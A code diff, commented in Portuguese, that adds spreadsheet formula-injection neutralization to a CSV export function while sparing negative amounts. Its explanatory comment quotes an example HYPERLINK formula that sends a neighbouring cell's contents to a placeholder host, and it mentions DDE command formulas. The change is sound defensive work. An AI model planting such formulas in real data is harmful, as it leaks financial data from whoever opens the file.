@@ -3,9 +3,48 @@
 // BOM UTF-8 (acentos corretos), separador ";", linhas CRLF e decimais com vírgula.
 // Regra do produto: só dados reais passam por aqui — mock nunca é exportado.
 
+/* ═══════════════════════════════════════════════════════════════════════════════════
+ * INJEÇÃO DE FÓRMULA — O QUE O EXCEL FAZ COM O QUE NÓS ESCREVEMOS
+ * ═══════════════════════════════════════════════════════════════════════════════════
+ * O escape abaixo resolve o formato CSV: aspas, `;` e quebras de linha. Não resolve o
+ * que a folha de cálculo faz DEPOIS de ler o ficheiro. O Excel, o LibreOffice e o
+ * Google Sheets tratam uma célula começada por `=`, `+`, `-` ou `@` como FÓRMULA e
+ * avaliam-na ao abrir.
+ *
+ * ─── PORQUE ISTO NÃO É TEÓRICO AQUI ────────────────────────────────────────────────
+ * As colunas exportadas incluem `cliente`, `fornecedor`, `title`, `description` e
+ * `category` — todas com origem no Bling, ou seja, texto que ninguém deste lado
+ * escreveu nem revê. Um fornecedor registado como
+ *
+ *     =HYPERLINK("https://exemplo.invalid/?d="&A1;"Fatura")
+ *
+ * exporta-se como fórmula e, no ficheiro que o contabilista abre, transforma-se numa
+ * ligação que leva consigo o conteúdo de outra célula. O `=cmd|...` do DDE é a versão
+ * pior do mesmo problema. Quem abre estes ficheiros é precisamente quem tem os números
+ * todos à frente.
+ *
+ * ─── O CUIDADO QUE ISTO OBRIGA: O `-` DE UM NÚMERO NEGATIVO ────────────────────────
+ * `-1234,56` começa por `-` e NÃO é uma fórmula: é um valor a pagar. Neutralizá-lo
+ * transformaria uma coluna de montantes em texto, e um CSV financeiro cujos números não
+ * somam é uma avaria maior do que aquela que se estava a corrigir. Por isso a guarda
+ * deixa passar o que é reconhecidamente um número — e só esse.
+ *
+ * A neutralização é o apóstrofo à cabeça, que é a convenção que estas três aplicações
+ * entendem como "isto é texto" e não mostram na célula. */
+const RE_INICIO_PERIGOSO = /^[=+\-@\t\r]/;
+/* Um número, com sinal opcional e vírgula OU ponto decimal — o que `csvMoney` produz e
+ * o que os campos numéricos trazem. Nada mais é tratado como número. */
+const RE_NUMERO = /^-?\d+(?:[.,]\d+)?$/;
+
+export function neutralizarFormula(s) {
+  if (!RE_INICIO_PERIGOSO.test(s)) return s;
+  if (RE_NUMERO.test(s)) return s;
+  return `'${s}`;
+}
+
 export function downloadCsv(filename, headers, rows) {
   const esc = (v) => {
-    const s = String(v ?? "");
+    const s = neutralizarFormula(String(v ?? ""));
     return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
   };
   const line = (cells) => cells.map(esc).join(";");
